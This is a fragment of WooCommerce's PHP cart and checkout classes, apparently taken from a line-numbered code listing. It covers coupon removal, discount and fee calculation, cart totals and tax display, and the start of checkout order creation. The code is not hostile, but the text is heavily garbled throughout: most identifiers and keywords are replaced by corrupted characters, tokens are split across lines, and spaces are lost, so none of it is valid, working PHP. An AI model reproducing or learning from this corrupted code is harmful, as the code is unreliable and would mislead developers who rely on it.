$coupÚ
->
	`­¶y_befÜe_x
() )

1662 
$this
->
	`»move_coupÚ
Ğ
$code
 );

1665 } 
	`–£if
 ( 'Üd”' =ğ
$ty³
 || 2 == $type ) {

1666 iàĞ
$this
->
­¶›d_coupÚs
 ) {

1667 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1668 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1670 iàĞ! 
$coupÚ
->
	`­¶y_befÜe_x
() )

1671 
$this
->
	`»move_coupÚ
Ğ
$code
 );

1675 
$this
->
­¶›d_coupÚs
 = $this->
coupÚ_discouÁ_amouÁs
 = $this->
coupÚ_­¶›d_couÁ
 = 
	`¬¿y
();

1676 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'­¶›d_coupÚs', 
	`¬¿y
() );

1677 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'coupÚ_discouÁ_amouÁs', 
	`¬¿y
() );

1679 
	}
}

1686 
public
 
funùiÚ
 
	$»move_coupÚ
Ğ
$coupÚ_code
 ) {

1688 iàĞ! 
$this
->
	`coupÚs_’abËd
() )

1689  
çl£
;

1692 
$coupÚ_code
 = 
	`­¶y_f‹rs
( 'woocommerce_coupon_code', $coupon_code );

1693 
$pos™iÚ
 = 
	`¬¿y_£¬ch
Ğ
$coupÚ_code
, 
$this
->
­¶›d_coupÚs
 );

1695 iàĞ
$pos™iÚ
 !=ğ
çl£
 )

1696 
	`un£t
Ğ
$this
->
­¶›d_coupÚs
[ 
$pos™iÚ
 ] );

1698 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'­¶›d_coupÚs', 
$this
->
­¶›d_coupÚs
 );

1700  
Œue
;

1701 
	}
}

1712 
public
 
funùiÚ
 
	$g‘_discouÁed_´iû
Ğ
$v®ues
, 
$´iû
, 
$add_tÙ®s
 = 
çl£
 ) {

1713 iàĞ! 
$´iû
 )

1714  
$´iû
;

1716 iàĞ! 
	`em±y
Ğ
$this
->
­¶›d_coupÚs
 ) ) {

1717 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1718 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1720 iàĞ
$coupÚ
->
	`­¶y_befÜe_x
(è&& $coupÚ->
	`is_v®id
() ) {

1721 iàĞ
$coupÚ
->
	`is_v®id_fÜ_´oduù
Ğ
$v®ues
['d©a'] ) || $coupÚ->
	`is_v®id_fÜ_ÿ¹
() ) {

1723 
$discouÁ_amouÁ
 = 
$coupÚ
->
	`g‘_discouÁ_amouÁ
Ğ
$´iû
, 
$v®ues
, 
$sšgË
 = 
Œue
 );

1724 
$´iû
 = 
	`max
Ğ$´iû - 
$discouÁ_amouÁ
, 0 );

1726 iàĞ
$add_tÙ®s
 ) {

1727 
$this
->
discouÁ_ÿ¹
 +ğ
$discouÁ_amouÁ
 * 
$v®ues
['quantity'];

1728 
$this
->
	`šü—£_coupÚ_discouÁ_amouÁ
Ğ
$code
, 
$discouÁ_amouÁ
 * 
$v®ues
['quantity'] );

1729 
$this
->
	`šü—£_coupÚ_­¶›d_couÁ
Ğ
$code
, 
$v®ues
['quantity'] );

1736  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_discouÁed_´iû', 
$´iû
, 
$v®ues
, 
$this
 );

1737 
	}
}

1744 
public
 
funùiÚ
 
	$­¶y_ÿ¹_discouÁs_aá”_x
() {

1745 
$´e_discouÁ_tÙ®
 = 
	`round
Ğ
$this
->
ÿ¹_cÚ‹Ás_tÙ®
 + $this->
x_tÙ®
 + $this->
shpšg_x_tÙ®
 + $this->
shpšg_tÙ®
 + $this->
ãe_tÙ®
, $this->
dp
 );

1747 iàĞ
$this
->
­¶›d_coupÚs
 ) {

1748 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1749 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1751 
	`do_aùiÚ
Ğ'woocomm”û_ÿ¹_discouÁ_aá”_x_' . 
$coupÚ
->
ty³
, $coupon );

1753 iàĞ
$coupÚ
->
	`is_v®id
(è&& ! $coupÚ->
	`­¶y_befÜe_x
(è&& $coupÚ->
	`is_v®id_fÜ_ÿ¹
() ) {

1754 
$discouÁ_amouÁ
 = 
$coupÚ
->
	`g‘_discouÁ_amouÁ
Ğ
$´e_discouÁ_tÙ®
 );

1755 
$´e_discouÁ_tÙ®
 = $´e_discouÁ_tÙ® - 
$discouÁ_amouÁ
;

1756 
$this
->
discouÁ_tÙ®
 +ğ
$discouÁ_amouÁ
;

1757 
$this
->
	`šü—£_coupÚ_discouÁ_amouÁ
Ğ
$code
, 
$discouÁ_amouÁ
 );

1758 
$this
->
	`šü—£_coupÚ_­¶›d_couÁ
Ğ
$code
 );

1762 
	}
}

1771 
public
 
funùiÚ
 
	$­¶y_´oduù_discouÁs_aá”_x
Ğ
$v®ues
, 
$´iû
 ) {

1772 iàĞ! 
	`em±y
Ğ
$this
->
­¶›d_coupÚs
 ) ) {

1773 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1774 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1776 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_discouÁ_aá”_x_' . 
$coupÚ
->
ty³
, $coupÚ, 
$v®ues
, 
$´iû
 );

1778 iàĞ
$coupÚ
->
	`is_v®id
(è&& ! $coupÚ->
	`­¶y_befÜe_x
(è&& $coupÚ->
	`is_v®id_fÜ_´oduù
Ğ
$v®ues
['data'] ) ) {

1779 
$discouÁ_amouÁ
 = 
$coupÚ
->
	`g‘_discouÁ_amouÁ
Ğ
$´iû
, 
$v®ues
 );

1780 
$this
->
discouÁ_tÙ®
 +ğ
$discouÁ_amouÁ
;

1781 
$this
->
	`šü—£_coupÚ_discouÁ_amouÁ
Ğ
$code
, 
$discouÁ_amouÁ
 );

1782 
$this
->
	`šü—£_coupÚ_­¶›d_couÁ
Ğ
$code
, 
$v®ues
['quantity'] );

1786 
	}
}

1795 
´iv©e
 
funùiÚ
 
	$šü—£_coupÚ_discouÁ_amouÁ
Ğ
$code
, 
$amouÁ
 ) {

1796 iàĞ
	`em±y
Ğ
$this
->
coupÚ_discouÁ_amouÁs
[ 
$code
 ] ) )

1797 
$this
->
coupÚ_discouÁ_amouÁs
[ 
$code
 ] = 0;

1799 
$this
->
coupÚ_discouÁ_amouÁs
[ 
$code
 ] +ğ
$amouÁ
;

1800 
	}
}

1809 
´iv©e
 
funùiÚ
 
	$šü—£_coupÚ_­¶›d_couÁ
Ğ
$code
, 
$couÁ
 = 1 ) {

1810 iàĞ
	`em±y
Ğ
$this
->
coupÚ_­¶›d_couÁ
[ 
$code
 ] ) )

1811 
$this
->
coupÚ_­¶›d_couÁ
[ 
$code
 ] = 0;

1813 
$this
->
coupÚ_­¶›d_couÁ
[ 
$code
 ] +ğ
$couÁ
;

1814 
	}
}

1828 
public
 
funùiÚ
 
add_ãe
Ğ
$Çme
, 
$amouÁ
, 
$xabË
 = 
çl£
, 
$x_şass
 = '' ) {

1830 
$Ãw_ãe_id
 = 
§n™ize_t™Ë
Ğ
$Çme
 );

1833 
fÜ—ch
 ( 
$this
->
ães
 
as
 
$ãe
 ) {

1834 iàĞ
	g$ãe
->
	gid
 =ğ
$Ãw_ãe_id
 ) {

1839 
	g$Ãw_ãe
 = 
Ãw
 
¡dCÏss
();

1840 
	g$Ãw_ãe
->
	gid
 = 
$Ãw_ãe_id
;

1841 
	g$Ãw_ãe
->
	gÇme
 = 
esc_©Œ
Ğ
$Çme
 );

1842 
	g$Ãw_ãe
->
	gamouÁ
 = (è
esc_©Œ
Ğ
$amouÁ
 );

1843 
	g$Ãw_ãe
->
	gx_şass
 = 
$x_şass
;

1844 
	g$Ãw_ãe
->
	gxabË
 = 
$xabË
 ? 
Œue
 : 
çl£
;

1845 
	g$Ãw_ãe
->
	gx
 = 0;

1846 
	g$this
->
	gães
[] = 
$Ãw_ãe
;

1855 
public
 
funùiÚ
 
	$g‘_ães
() {

1856  
	`¬¿y_f‹r
Ğ(
¬¿y
è
$this
->
ães
 );

1857 
	}
}

1862 
public
 
funùiÚ
 
	$ÿlcuÏ‹_ães
() {

1865 
	`do_aùiÚ
Ğ'woocomm”û_ÿ¹_ÿlcuÏ‹_ães', 
$this
 );

1868 iàĞ! 
	`em±y
Ğ
$this
->
ães
 ) ) {

1869 
	`fÜ—ch
 ( 
$this
->
ães
 
as
 
$ãe_key
 => 
$ãe
 ) {

1870 
$this
->
ãe_tÙ®
 +ğ
$ãe
->
amouÁ
;

1872 iàĞ
$ãe
->
xabË
 ) {

1874 
$x_¿‹s
 = 
$this
->
x
->
	`g‘_¿‹s
Ğ
$ãe
->
x_şass
 );

1875 
$ãe_xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$ãe
->
amouÁ
, 
$x_¿‹s
, 
çl£
 );

1877 iàĞ! 
	`em±y
Ğ
$ãe_xes
 ) ) {

1879 
$this
->
ães
[ 
$ãe_key
 ]->
x
 = 
	`¬¿y_sum
Ğ
$ãe_xes
 );

1882 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$this
->
xes
 + 
$ãe_xes
 ) 
as
 
$key
 ) {

1883 
$this
->
xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$ãe_xes
[ $key ] ) ? $fee_taxes[ $key ] : 0 ) + ( isset( $this->taxes[ $key ] ) ? $this->taxes[ $key ] : 0 );

1889 
	}
}

1900 
public
 
funùiÚ
 
	$g‘_Üd”_discouÁ_tÙ®
() {

1901  
$this
->
discouÁ_tÙ®
;

1902 
	}
}

1909 
public
 
funùiÚ
 
	$g‘_ÿ¹_discouÁ_tÙ®
() {

1910  
$this
->
discouÁ_ÿ¹
;

1911 
	}
}

1918 
public
 
funùiÚ
 
	$g‘_tÙ®
() {

1919  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_tÙ®', 
	`wc_´iû
Ğ
$this
->
tÙ®
 ) );

1920 
	}
}

1927 
public
 
funùiÚ
 
	$g‘_tÙ®_ex_x
() {

1928 
$tÙ®
 = 
$this
->
tÙ®
 - $this->
x_tÙ®
 - $this->
shpšg_x_tÙ®
;

1929 iàĞ
$tÙ®
 < 0 )

1930 
$tÙ®
 = 0;

1931  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_tÙ®_ex_x', 
	`wc_´iû
Ğ
$tÙ®
 ) );

1932 
	}
}

1939 
public
 
funùiÚ
 
	$g‘_ÿ¹_tÙ®
() {

1940 iàĞ! 
$this
->
´iûs_šşude_x
 ) {

1941 
$ÿ¹_cÚ‹Ás_tÙ®
 = 
	`wc_´iû
Ğ
$this
->
ÿ¹_cÚ‹Ás_tÙ®
 );

1943 
$ÿ¹_cÚ‹Ás_tÙ®
 = 
	`wc_´iû
Ğ
$this
->
ÿ¹_cÚ‹Ás_tÙ®
 + $this->
x_tÙ®
 );

1946  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_cÚ‹Ás_tÙ®', 
$ÿ¹_cÚ‹Ás_tÙ®
 );

1947 
	}
}

1955 
public
 
funùiÚ
 
	$g‘_ÿ¹_subtÙ®
Ğ
$compound
 = 
çl£
 ) {

1959 iàĞ
$compound
 ) {

1961 
$ÿ¹_subtÙ®
 = 
	`wc_´iû
Ğ
$this
->
ÿ¹_cÚ‹Ás_tÙ®
 + $this->
shpšg_tÙ®
 + $this->
	`g‘_xes_tÙ®
Ğ
çl£
, false ) );

1967 iàĞ
$this
->
x_di¥Ïy_ÿ¹
 == 'excl' ) {

1969 
$ÿ¹_subtÙ®
 = 
	`wc_´iû
Ğ
$this
->
subtÙ®_ex_x
 );

1971 iàĞ
$this
->
x_tÙ®
 > 0 && $this->
´iûs_šşude_x
 ) {

1972 
$ÿ¹_subtÙ®
 .ğ' <sm®l>' . 
	`WC
()->
couÁr›s
->
	`ex_x_Ü_v©
() . '</small>';

1977 
$ÿ¹_subtÙ®
 = 
	`wc_´iû
Ğ
$this
->
subtÙ®
 );

1979 iàĞ
$this
->
x_tÙ®
 > 0 && !$this->
´iûs_šşude_x
 ) {

1980 
$ÿ¹_subtÙ®
 .ğ' <sm®l>' . 
	`WC
()->
couÁr›s
->
	`šc_x_Ü_v©
() . '</small>';

1986  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_subtÙ®', 
$ÿ¹_subtÙ®
, 
$compound
, 
$this
 );

1987 
	}
}

1995 
public
 
funùiÚ
 
	$g‘_´oduù_´iû
Ğ
$_´oduù
 ) {

1996 iàĞ
$this
->
x_di¥Ïy_ÿ¹
 == 'excl' )

1997 
$´oduù_´iû
 = 
$_´oduù
->
	`g‘_´iû_exşudšg_x
();

1999 
$´oduù_´iû
 = 
$_´oduù
->
	`g‘_´iû_šşudšg_x
();

2001  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_´oduù_´iû', 
	`wc_´iû
Ğ
$´oduù_´iû
 ), 
$_´oduù
 );

2002 
	}
}

2015 
public
 
funùiÚ
 
	$g‘_´oduù_subtÙ®
Ğ
$_´oduù
, 
$quªt™y
 ) {

2017 
$´iû
 = 
$_´oduù
->
	`g‘_´iû
();

2018 
$xabË
 = 
$_´oduù
->
	`is_xabË
();

2021 iàĞ
$xabË
 ) {

2023 iàĞ
$this
->
x_di¥Ïy_ÿ¹
 == 'excl' ) {

2025 
$row_´iû
 = 
$_´oduù
->
	`g‘_´iû_exşudšg_x
Ğ
$quªt™y
 );

2026 
$´oduù_subtÙ®
 = 
	`wc_´iû
Ğ
$row_´iû
 );

2028 iàĞ
$this
->
´iûs_šşude_x
 && $this->
x_tÙ®
 > 0 )

2029 
$´oduù_subtÙ®
 .ğ' <sm®Èşass="x_Ïb–">' . 
	`WC
()->
couÁr›s
->
	`ex_x_Ü_v©
() . '</small>';

2033 
$row_´iû
 = 
$_´oduù
->
	`g‘_´iû_šşudšg_x
Ğ
$quªt™y
 );

2034 
$´oduù_subtÙ®
 = 
	`wc_´iû
Ğ
$row_´iû
 );

2036 iàĞ! 
$this
->
´iûs_šşude_x
 && $this->
x_tÙ®
 > 0 )

2037 
$´oduù_subtÙ®
 .ğ' <sm®Èşass="x_Ïb–">' . 
	`WC
()->
couÁr›s
->
	`šc_x_Ü_v©
() . '</small>';

2044 
$row_´iû
 = 
$´iû
 * 
$quªt™y
;

2045 
$´oduù_subtÙ®
 = 
	`wc_´iû
Ğ
$row_´iû
 );

2049  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_´oduù_subtÙ®', 
$´oduù_subtÙ®
, 
$_´oduù
, 
$quªt™y
, 
$this
 );

2050 
	}
}

2057 
public
 
funùiÚ
 
	$g‘_ÿ¹_x
() {

2058 
$ÿ¹_tÙ®_x
 = 
	`wc_round_x_tÙ®
Ğ
$this
->
x_tÙ®
 + $this->
shpšg_x_tÙ®
 );

2060  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_ÿ¹_x', 
$ÿ¹_tÙ®_x
 ? 
	`wc_´iû
( $cart_total_tax ) : '' );

2061 
	}
}

2070 
public
 
funùiÚ
 
	$g‘_xes_tÙ®
Ğ
$compound
 = 
Œue
, 
$di¥Ïy
 =rue ) {

2071 
$tÙ®
 = 0;

2072 
	`fÜ—ch
 ( 
$this
->
xes
 
as
 
$key
 => 
$x
 ) {

2073 iàĞ! 
$compound
 && 
$this
->
x
->
	`is_compound
Ğ
$key
 ) ) ;

2074 
$tÙ®
 +ğ
$x
;

2076 
	`fÜ—ch
 ( 
$this
->
shpšg_xes
 
as
 
$key
 => 
$x
 ) {

2077 iàĞ! 
$compound
 && 
$this
->
x
->
	`is_compound
Ğ
$key
 ) ) ;

2078 
$tÙ®
 +ğ
$x
;

2080 iàĞ
$di¥Ïy
 ) {

2081 
$tÙ®
 = 
	`wc_round_x_tÙ®
( $total );

2083  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_xes_tÙ®', 
$tÙ®
, 
$compound
, 
$di¥Ïy
, 
$this
 );

2084 
	}
}

2091 
public
 
funùiÚ
 
	$g‘_discouÁs_befÜe_x
() {

2092 iàĞ
$this
->
discouÁ_ÿ¹
 ) {

2093 
$discouÁs_befÜe_x
 = 
	`wc_´iû
Ğ
$this
->
discouÁ_ÿ¹
 );

2095 
$discouÁs_befÜe_x
 = 
çl£
;

2097  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_discouÁs_befÜe_x', 
$discouÁs_befÜe_x
, 
$this
 );

2098 
	}
}

2105 
public
 
funùiÚ
 
	$g‘_discouÁs_aá”_x
() {

2106 iàĞ
$this
->
discouÁ_tÙ®
 ) {

2107 
$discouÁs_aá”_x
 = 
	`wc_´iû
Ğ
$this
->
discouÁ_tÙ®
 );

2109 
$discouÁs_aá”_x
 = 
çl£
;

2111  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_discouÁs_aá”_x', 
$discouÁs_aá”_x
, 
$this
 );

2112 
	}
}

2119 
public
 
funùiÚ
 
	$g‘_tÙ®_discouÁ
() {

2120 iàĞ
$this
->
discouÁ_tÙ®
 || $this->
discouÁ_ÿ¹
 ) {

2121 
$tÙ®_discouÁ
 = 
	`wc_´iû
Ğ
$this
->
discouÁ_tÙ®
 + $this->
discouÁ_ÿ¹
 );

2123 
$tÙ®_discouÁ
 = 
çl£
;

2125  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_tÙ®_discouÁ', 
$tÙ®_discouÁ
, 
$this
 );

2126 
	}
}

	@includes/class-wc-checkout.php

1 <?
php


13 şas 
	cWC_Checkout
 {

16 
public
 
	m$po¡ed
;

19 
public
 
	m$checkout_f›lds
;

22 
public
 
	m$mu¡_ü—‹_accouÁ
;

25 
public
 
	m$’abË_signup
;

28 
´iv©e
 
	m$shpšg_m‘hod
;

31 
´iv©e
 
	m$·ym’t_m‘hod
;

34 
´iv©e
 
	m$cu¡om”_id
;

40 
´Ùeùed
 
	m$_š¡ªû
 = 
nuÎ
;

52 
public
 
funùiÚ
 
	$š¡ªû
() {

53 iàĞ
	`is_nuÎ
Ğ
£lf
::
$_š¡ªû
 ) )

54 
£lf
::
$_š¡ªû
 = 
Ãw
 
	`£lf
();

55  
£lf
::
$_š¡ªû
;

63 
public
 
funùiÚ
 
	$__şÚe
() {

64 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

65 
	}
}

72 
public
 
funùiÚ
 
	$__wakeup
() {

73 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

74 
	}
}

82 
public
 
funùiÚ
 
	$__cÚ¡ruù
 () {

83 
	`add_aùiÚ
Ğ'woocomm”û_checkout_blšg', 
	`¬¿y
Ğ
$this
,'checkout_form_billing' ) );

84 
	`add_aùiÚ
Ğ'woocomm”û_checkout_shpšg', 
	`¬¿y
Ğ
$this
,'checkout_form_shipping' ) );

86 
$this
->
’abË_signup
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_’abË_signup_ªd_logš_äom_checkout' ) =ğ'yes' ? 
Œue
 : 
çl£
;

87 
$this
->
’abË_gue¡_checkout
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_’abË_gue¡_checkout' ) =ğ'yes' ? 
Œue
 : 
çl£
;

88 
$this
->
mu¡_ü—‹_accouÁ
 = $this->
’abË_gue¡_checkout
 || 
	`is_u£r_logged_š
(è? 
çl£
 : 
Œue
;

91 
$this
->
checkout_f›lds
['blšg'] = 
	`WC
()->
couÁr›s
->
	`g‘_add»ss_f›lds
Ğ$this->
	`g‘_v®ue
('billing_country'), 'billing_' );

92 
$this
->
checkout_f›lds
['shpšg'] = 
	`WC
()->
couÁr›s
->
	`g‘_add»ss_f›lds
Ğ$this->
	`g‘_v®ue
('shipping_country'), 'shipping_' );

94 iàĞ
	`g‘_İtiÚ
( 'woocommerce_registration_generate_username' ) == 'no' ) {

95 
$this
->
checkout_f›lds
['accouÁ']['accouÁ_u£ºame'] = 
	`¬¿y
(

97 'Ïb–' => 
	`__
( 'Account username', 'woocommerce' ),

98 '»quœed' => 
Œue
,

99 '¶aûhŞd”' => 
	`_x
( 'Username', 'placeholder', 'woocommerce' )

103 iàĞ
	`g‘_İtiÚ
( 'woocommerce_registration_generate_password' ) == 'no' ) {

104 
$this
->
checkout_f›lds
['accouÁ']['accouÁ_·sswÜd'] = 
	`¬¿y
(

106 'Ïb–' => 
	`__
( 'Account…assword', 'woocommerce' ),

107 '»quœed' => 
Œue
,

108 '¶aûhŞd”' => 
	`_x
( 'Password', 'placeholder', 'woocommerce' )

112 
$this
->
checkout_f›lds
['Üd”'] = 
	`¬¿y
(

113 'Üd”_comm’ts' => 
	`¬¿y
(

115 'şass' => 
	`¬¿y
('notes'),

116 'Ïb–' => 
	`__
( 'Order Notes', 'woocommerce' ),

117 '¶aûhŞd”' => 
	`_x
('Notes‡bout your order,ƒ.g. special‚otes for delivery.', 'placeholder', 'woocommerce')

121 
$this
->
checkout_f›lds
 = 
	`­¶y_f‹rs
( 'woocommerce_checkout_fields', $this->checkout_fields );

123 
	`do_aùiÚ
Ğ'woocomm”û_checkout_š™', 
$this
 );

124 
	}
}

130 
public
 
funùiÚ
 
	$check_ÿ¹_™ems
() {

132 
	`do_aùiÚ
('woocommerce_check_cart_items');

133 
	}
}

142 
public
 
funùiÚ
 
	$checkout_fÜm_blšg
() {

143 
	`wc_g‘_‹m¶©e
Ğ'checkout/fÜm-blšg.php', 
	`¬¿y
Ğ'checkout' => 
$this
 ) );

144 
	}
}

153 
public
 
funùiÚ
 
	$checkout_fÜm_shpšg
() {

154 
	`wc_g‘_‹m¶©e
Ğ'checkout/fÜm-shpšg.php', 
	`¬¿y
Ğ'checkout' => 
$this
 ) );

155 
	}
}

164 
public
 
funùiÚ
 
	$ü—‹_Üd”
() {

165 
glob®
 
$wpdb
;

168 
$Üd”_id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ü—‹_Üd”', 
nuÎ
, 
$this
 );

170 iàĞ
	`is_num”ic
Ğ
$Üd”_id
 ) )

171  
$Üd”_id
;

174 
$Üd”_d©a
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Ãw_Üd”_d©a', 
	`¬¿y
(

176 'po¡_t™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'Ord” &ndash; %s', 'woocomm”û' ), 
	`¡ráime
Ğ
	`_x
( '%b %d, %Y @ %I:%M %p', 'Order date…arsed by strftime', 'woocommerce' ) ) ),

179 'po¡_exû½t' => 
	`is£t
Ğ
$this
->
po¡ed
['order_comments'] ) ? $this->posted['order_comments'] : '',

181 'po¡_·sswÜd' => 
	`uniqid
( 'order_' )

185 
$ü—‹_Ãw_Üd”
 = 
Œue
;

187 iàĞ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 > 0 ) {

189 
$Üd”_id
 = 
	`absšt
Ğ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 );

192 
$‹rms
 = 
	`wp_g‘_objeù_‹rms
Ğ
$Üd”_id
, 'shİ_Üd”_¡©us', 
	`¬¿y
( 'fields' => 'slugs' ) );

193 
$Üd”_¡©us
 = 
	`is£t
Ğ
$‹rms
[0] ) ? $terms[0] : 'pending';

196 iàĞ
	`g‘_po¡
Ğ
$Üd”_id
 ) && ( 
$Üd”_¡©us
 == 'pending' || $order_status == 'failed' ) ) {

199 
$ü—‹_Ãw_Üd”
 = 
çl£
;

200 
$Üd”_d©a
['ID'] = 
$Üd”_id
;

201 
	`wp_upd©e_po¡
Ğ
$Üd”_d©a
 );

204 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_Üd”_™emm‘¨WHERE ord”_™em_id IN ( SELECT ord”_™em_id FROM {$wpdb->´efix}woocomm”û_Üd”_™em WHERE ord”_id = %d )", 
$Üd”_id
 ) );

206 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_Üd”_™em WHERE ord”_id = %d", 
$Üd”_id
 ) );

209 
	`do_aùiÚ
Ğ'woocomm”û_»sume_Üd”', 
$Üd”_id
 );

213 iàĞ
$ü—‹_Ãw_Üd”
 ) {

214 
$Üd”_id
 = 
	`wp_š£¹_po¡
Ğ
$Üd”_d©a
, 
Œue
 );

216 iàĞ
	`is_wp_”rÜ
Ğ
$Üd”_id
 ) )

217 
throw
 
Ãw
 
	`Exû±iÚ
( 'Error: Unableo create order. Pleasery‡gain.' );

219 
	`do_aùiÚ
Ğ'woocomm”û_Ãw_Üd”', 
$Üd”_id
 );

223 iàĞ
$this
->
checkout_f›lds
['billing'] )

224 
	`fÜ—ch
 ( 
$this
->
checkout_f›lds
['blšg'] 
as
 
$key
 => 
$f›ld
 ) {

225 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_' . 
$key
, 
$this
->
po¡ed
[ $key ] );

227 iàĞ
$this
->
cu¡om”_id
 && 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_upd©e_cu¡om”_d©a', 
Œue
, $this ) )

228 
	`upd©e_u£r_m‘a
Ğ
$this
->
cu¡om”_id
, 
$key
, $this->
po¡ed
[ $key ] );

231 iàĞ
$this
->
checkout_f›lds
['shpšg'] && 
	`WC
()->
ÿ¹
->
	`Ãeds_shpšg
() ) {

232 
	`fÜ—ch
 ( 
$this
->
checkout_f›lds
['shpšg'] 
as
 
$key
 => 
$f›ld
 ) {

233 
$po¡v®ue
 = 
çl£
;

235 iàĞ
$this
->
po¡ed
['sh_to_difã»Á_add»ss'] =ğ
çl£
 ) {

236 iàĞ
	`is£t
Ğ
$this
->
po¡ed
[ 
	`¡r_»¶aû
Ğ'shpšg_', 'blšg_', 
$key
 ) ] ) ) {

237 
$po¡v®ue
 = 
$this
->
po¡ed
[ 
	`¡r_»¶aû
Ğ'shpšg_', 'blšg_', 
$key
 ) ];

238 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_' . 
$key
, 
$po¡v®ue
 );

241 
$po¡v®ue
 = 
$this
->
po¡ed
[ 
$key
 ];

242 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_' . 
$key
, 
$po¡v®ue
 );

246 iàĞ
$po¡v®ue
 && 
$this
->
cu¡om”_id
 && 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_upd©e_cu¡om”_d©a', 
Œue
, $this ) )

247 
	`upd©e_u£r_m‘a
Ğ
$this
->
cu¡om”_id
, 
$key
, 
$po¡v®ue
 );

252 iàĞ
$this
->
cu¡om”_id
 )

253 
	`do_aùiÚ
Ğ'woocomm”û_checkout_upd©e_u£r_m‘a', 
$this
->
cu¡om”_id
, $this->
po¡ed
 );

256 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

258 
$_´oduù
 = 
$v®ues
['data'];

261 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

262 'Üd”_™em_Çme' => 
$_´oduù
->
	`g‘_t™Ë
(),

267 iàĞ
$™em_id
 ) {

268 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_qty', 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_amouÁ', 
$v®ues
['quantity'] ) );

269 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_x_şass', 
$_´oduù
->
	`g‘_x_şass
() );

270 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_´oduù_id', 
$v®ues
['product_id'] );

271 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_v¬ŸtiÚ_id', 
$v®ues
['variation_id'] );

272 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®', 
	`wc_fÜm©_decim®
Ğ
$v®ues
['line_subtotal'] ) );

273 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_tÙ®', 
	`wc_fÜm©_decim®
Ğ
$v®ues
['line_total'] ) );

274 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_x', 
	`wc_fÜm©_decim®
Ğ
$v®ues
['line_tax'] ) );

275 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®_x', 
	`wc_fÜm©_decim®
Ğ
$v®ues
['line_subtotal_tax'] ) );

278 iàĞ
$v®ues
['v¬ŸtiÚ'] && 
	`is_¬¿y
( $values['variation'] ) ) {

279 
	`fÜ—ch
 ( 
$v®ues
['v¬ŸtiÚ'] 
as
 
$key
 => 
$v®ue
 ) {

280 
$key
 = 
	`¡r_»¶aû
( 'attribute_', '', $key );

281 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 
$key
, 
$v®ue
 );

286 iàĞ
$_´oduù
->
	`backÜd”s_»quœe_nÙifiÿtiÚ
(è&& $_´oduù->
	`is_Ú_backÜd”
Ğ
$v®ues
['quantity'] ) ) {

287 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 
	`­¶y_f‹rs
Ğ'woocomm”û_backÜd”ed_™em_m‘a_Çme', 
	`__
Ğ'BackÜd”ed', 'woocomm”û' ), 
$ÿ¹_™em_key
, 
$Üd”_id
 ), 
$v®ues
['quªt™y'] - 
	`max
Ğ0, 
$_´oduù
->
	`g‘_tÙ®_¡ock
() ) );

291 
	`do_aùiÚ
